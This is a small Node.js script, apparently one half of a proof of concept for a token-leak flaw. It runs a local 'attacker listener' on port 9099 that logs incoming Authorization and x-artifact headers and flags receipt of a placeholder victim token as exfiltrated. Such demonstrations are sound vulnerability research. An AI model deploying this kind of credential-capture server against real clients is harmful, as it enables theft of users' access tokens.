const http = require('http');
let hits = 0;
const srv = http.createServer((req, res) => {
  let body = '';
  req.on('data', c => body += c);
  req.on('end', () => {
    hits++;
    const auth = req.headers['authorization'] || '(none)';
    console.log(`\n[HIT ${hits}] ${req.method} ${req.url}`);
    console.log(`   Authorization: ${auth}`);
    console.log(`   x-artifact headers: ${Object.keys(req.headers).filter(h=>h.startsWith('x-artifact')).map(h=>h+'='+req.headers[h]).join(', ')||'(none)'}`);
    if (auth.includes('VICTIM_SECRET_TOKEN')) console.log('   >>> !!! VICTIM TOKEN EXFILTRATED TO ATTACKER HOST !!!');
    res.writeHead(200, {'content-type':'application/json'});
    res.end('{}');
  });
});
srv.listen(9099, '127.0.0.1', () => console.log('attacker listener on http://127.0.0.1:9099'));
setTimeout(() => { console.log(`\n[listener] done, ${hits} request(s) received`); process.exit(0); }, 15000);
